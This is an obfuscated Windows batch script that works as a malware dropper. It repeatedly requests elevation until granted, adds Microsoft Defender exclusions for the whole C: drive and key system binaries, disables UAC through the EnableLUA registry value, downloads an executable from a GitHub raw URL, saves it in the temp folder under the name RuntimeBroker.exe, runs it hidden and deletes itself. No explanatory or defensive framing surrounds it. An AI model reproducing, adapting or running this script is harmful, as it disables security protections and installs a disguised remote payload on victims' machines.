@echo off & setlocal enableDelayedExpansion
set "ZiAIL=SESSION" & set "HHD=2>&1" & set "fJwJN=NET" & set "vaUj=>nul"
%fJwJN% %ZiAIL% %vaUj% %HHD%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "QkmA=qux" & set "MaPyB=foo" & set "NqtIS=baz" & set "GDWs=bar" & rem xRP YSK DIKpmgf
set "NKMs=powershell -ExecutionPolicy Bypass -Command"
set "EAEOJ=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "MxeIE='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "JKmZ='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!NKMs! "!EAEOJ! !MxeIE! !JKmZ!" %vaUj% %HHD%
set "Jgyl=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "uBuI=-Name 'EnableLUA' -Value 0"
!NKMs! "!Jgyl! !uBuI!" %vaUj% %HHD%
set "lrQf=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!NKMs! "!lrQf!" %vaUj% %HHD%
if !errorlevel! neq 0 (goto %a%)
set "ohs=timeout /t" & !ohs! 2 %vaUj% %HHD%
set "rDA=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "vNjxw=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "hLzO=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!NKMs! "!rDA! !vNjxw! !hLzO!" %vaUj% %HHD%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!ohs! 1 %vaUj% %HHD% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %vaUj% %HHD%
del /f /q "%~f0" %vaUj% %HHD%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %vaUj% %HHD%
if !errorlevel! neq 0 (!ohs! 3 %vaUj% %HHD% & goto %b%)
exit /b
